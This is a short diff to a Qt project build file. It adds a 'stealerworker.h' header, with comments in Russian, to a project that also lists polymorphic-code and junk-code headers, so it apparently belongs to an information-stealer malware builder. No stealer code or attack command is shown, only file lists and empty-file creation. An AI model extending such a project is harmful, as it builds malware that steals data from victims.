@@ -20,7 +20,8 @@ HEADERS += \
     mainwindow.h \
     ../src/build_key.h \
     ../src/polymorphic_code.h \
-    ../src/junk_code.h
+    ../src/junk_code.h \
+    ../src/stealerworker.h # Добавлено
 
 # Файлы интерфейса (.ui)
 FORMS += \
@@ -120,7 +121,8 @@ win32 {
 PRE_TARGETDEPS += \
     ../src/build_key.h \
     ../src/polymorphic_code.h \
-    ../src/junk_code.h
+    ../src/junk_code.h \
+    ../src/stealerworker.h # Добавлено
 
 # Создание пустых файлов, если они отсутствуют
 !exists(../src/build_key.h) {
@@ -132,3 +134,6 @@ PRE_TARGETDEPS += \
 !exists(../src/junk_code.h) {
     system(echo. > ../src/junk_code.h)
 }
+!exists(../src/stealerworker.h) {
+    system(echo. > ../src/stealerworker.h)
+} # Добавлено
